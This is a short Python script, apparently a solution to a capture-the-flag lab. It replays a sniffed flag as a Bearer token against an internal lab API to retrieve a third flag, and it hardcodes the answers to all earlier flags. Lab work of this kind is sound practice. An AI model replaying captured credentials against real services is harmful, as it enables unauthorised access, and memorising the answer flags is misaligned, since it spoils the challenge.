#!/usr/bin/env python3
"""
Get Flag 3 from secret_api using Flag 1 as authentication token
"""

import sys
import json
import urllib.request
import urllib.error

# Flag 1 (API token)
FLAG1 = "FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}"
API_URL = "http://172.20.0.21:8888"

def make_request(url, headers=None):
    """Make an HTTP request and return the response"""
    try:
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.read().decode('utf-8')
    except urllib.error.HTTPError as e:
        # Even errors might have useful data
        return e.read().decode('utf-8')
    except Exception as e:
        return f'{{"error": "{str(e)}"}}'

def main():
    print("="*60)
    print("Getting Flag 3 from Secret API")
    print("="*60)
    print()
    print(f"📋 Using Flag 1 as API authentication token")
    print(f"   Flag 1: {FLAG1}")
    print(f"   API: {API_URL}")
    print()
    
    # Test API connectivity
    print("1. Testing API connectivity...")
    health_response = make_request(f"{API_URL}/health")
    try:
        health_data = json.loads(health_response)
        print(json.dumps(health_data, indent=2))
    except:
        print(health_response)
    print()
    
    # Get Flag 3
    print("2. Requesting Flag 3 with authentication...")
    print(f"   URL: {API_URL}/flag")
    print(f"   Header: Authorization: Bearer {FLAG1}")
    print()
    
    headers = {
        "Authorization": f"Bearer {FLAG1}"
    }
    
    response = make_request(f"{API_URL}/flag", headers=headers)
    
    # Pretty print JSON
    try:
        data = json.loads(response)
        print(json.dumps(data, indent=2))
        
        # Extract flag
        if "flag" in data:
            flag3 = data["flag"]
            print()
            print("="*60)
            print(f"✅ Flag 3 captured: {flag3}")
            print()
            print("🎉 All flags captured!")
            print("   Flag 1: FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}")
            print("   Flag 2: FLAG{h1dd3n_s3rv1c3s_n33d_pr0t3ct10n}")
            print(f"   Flag 3: {flag3}")
        else:
            print()
            print("⚠️  Flag not found in response")
            print("   Check the response above manually")
    except:
        print(response)
        print()
        print("⚠️  Could not parse response as JSON")
        # Try to extract flag anyway
        import re
        flags = re.findall(r'FLAG\{[^}]+\}', response)
        if flags:
            print(f"✅ Found flag: {flags[0]}")

if __name__ == "__main__":
    main()

